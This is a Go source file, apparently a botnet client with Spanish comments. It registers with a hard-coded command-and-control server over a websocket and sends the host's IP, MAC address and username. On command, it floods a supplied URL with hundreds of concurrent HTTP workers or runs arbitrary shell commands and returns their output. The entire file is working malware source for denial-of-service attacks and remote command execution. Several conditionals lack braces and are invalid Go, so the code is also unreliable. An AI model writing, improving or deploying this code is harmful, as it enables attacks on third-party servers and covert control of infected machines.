package main

import (
	"context"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

type ClientInfo struct {
	IP       string `json:"ip"`
	MAC      string `json:"mac"`
	Username string `json:"username"`
}

var (
	CENTRALITA_IP = "ws://192.168.1.103:42069/ws" // TODO: cambiar esta patraña
	cancelFunc    context.CancelFunc

	// cosas de intensidad
	concurrencia = 300
)


// cosas de websocket
const (
	writeWait  = 10 * time.Second
	pongWait   = 60 * time.Second
	pingPeriod = (pongWait * 9) / 10
)

func StressConnections(ctx context.Context, url string, concurrency int) {
	tr := &http.Transport{
		MaxIdleConns:        concurrency * 4,
		MaxIdleConnsPerHost: concurrency,
		DisableKeepAlives:   false,
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   5 * time.Second,
	}

	var wg sync.WaitGroup

	worker := func() {
		defer wg.Done()

		ticker := time.NewTicker(10 * time.Millisecond) // agresividad aqui
		defer ticker.Stop()

		for {
			select {
			case <-ctx.Done():
				return

			case <-ticker.C:
				resp, err := client.Get(url)
				if err == nil {
					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
				}
			}
		}
	}

	wg.Add(concurrency)
	for i := 0; i < concurrency; i++ {
		go worker()
	}

	wg.Wait()
}

func getLocalIP() string {
	addrs, _ := net.InterfaceAddrs()
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			return ipnet.IP.String()
		}
	}
	return "ni puta idea"
}

func getLocalMAC(preferIP string) string {
	ip := net.ParseIP(preferIP)

	ifaces, err := net.Interfaces()
	if err != nil {
		return "ni puta idea"
	}

	var fallback string
	for _, iface := range ifaces {
		// saltar loopback / interfaces down
		if (iface.Flags&net.FlagLoopback) != 0 || (iface.Flags&net.FlagUp) == 0 {
			continue
		}
		if len(iface.HardwareAddr) == 0 continue // si no hay MAC, saltamos

		if fallback == "" fallback = iface.HardwareAddr.String()

		// si tenemos IP, buscamos interfaz
		if ip != nil {
			addrs, err := iface.Addrs()
			if err != nil {
				continue
			}
			for _, a := range addrs {
				ipnet, ok := a.(*net.IPNet)

				if !ok || ipnet.IP == nil continue // si no es IP, saltamos
				if ipnet.IP.Equal(ip) return iface.HardwareAddr.String() // si es la IP, devolvemos la MAC
			}
		}
	}

	if fallback != "" {
		return fallback
	}
	return "ni puta idea"
}

func executeShellCommand(command string) (string, error) {
	cmd := exec.Command("sh", "-c", command)
	output, err := cmd.CombinedOutput()
	return string(output), err
}

func main() {
	wsURL := CENTRALITA_IP

	for {
		conn, _, err := websocket.DefaultDialer.Dial(wsURL, nil)
		if err != nil {
			fmt.Printf("dial error (%s): %v\n", wsURL, err)
			time.Sleep(10 * time.Second)
			continue
		}

		remote := conn.RemoteAddr().String()
		conn.SetReadLimit(1024 * 1024)
		_ = conn.SetReadDeadline(time.Now().Add(pongWait))
		conn.SetPongHandler(func(string) error {
			return conn.SetReadDeadline(time.Now().Add(pongWait))
		})

		localIP := getLocalIP()
		info := ClientInfo{
			IP:       localIP,
			MAC:      getLocalMAC(localIP),
			Username: os.Getenv("USER"),
		}
		_ = conn.SetWriteDeadline(time.Now().Add(writeWait))
		if err := conn.WriteJSON(info); err != nil {
			fmt.Printf("hello write error (%s): %v\n", remote, err)
			conn.Close()
			time.Sleep(3 * time.Second)
			continue
		}

		fmt.Printf("connected to centralita: %s as user=%q ip=%q\n", remote, info.Username, info.IP)

		done := make(chan struct{})
		go func() {
			ticker := time.NewTicker(pingPeriod)
			defer ticker.Stop()
			for {
				select {
				case <-done:
					return
				case <-ticker.C:
					_ = conn.SetWriteDeadline(time.Now().Add(writeWait))
					if err := conn.WriteMessage(websocket.PingMessage, nil); err != nil {
						fmt.Printf("ping error (%s): %v\n", remote, err)
						return
					}
				}
			}
		}()

		for {
			var msg map[string]string
			if err := conn.ReadJSON(&msg); err != nil {
				fmt.Printf("read error (%s): %v\n", remote, err)
				if cancelFunc != nil {
					cancelFunc()
				}
				conn.Close()
				close(done)
				break
			}

			// =======================
			// 	aqui van las ordenes que se pueden recibir de la centralita
			switch msg["action"] {
			case "START":
				if cancelFunc != nil {
					cancelFunc()
				}
				fmt.Println("atacando ", msg["payload"])
				ctx, cancel := context.WithCancel(context.Background())
				cancelFunc = cancel

				go StressConnections(ctx, msg["payload"], concurrencia)

			case "STOP":
				if cancelFunc != nil {
					cancelFunc()
					cancelFunc = nil
					fmt.Println("se para")
				}

			case "SHELL":
				command := msg["payload"]
				fmt.Printf("ejecutando: %s\n", command)

				output, err := executeShellCommand(command)
				if err != nil {
					output = fmt.Sprintf("error: %v", err)
				}

				// enviamos la respuesta, realmente no es un shell
				response := map[string]string{
					"action":  "SHELL_RESULT",
					"payload": output,
				}

				_ = conn.SetWriteDeadline(time.Now().Add(writeWait))
				if err := conn.WriteJSON(response); err != nil {
					fmt.Println("error de envío:", err)
				}

			}
		}
	}
}
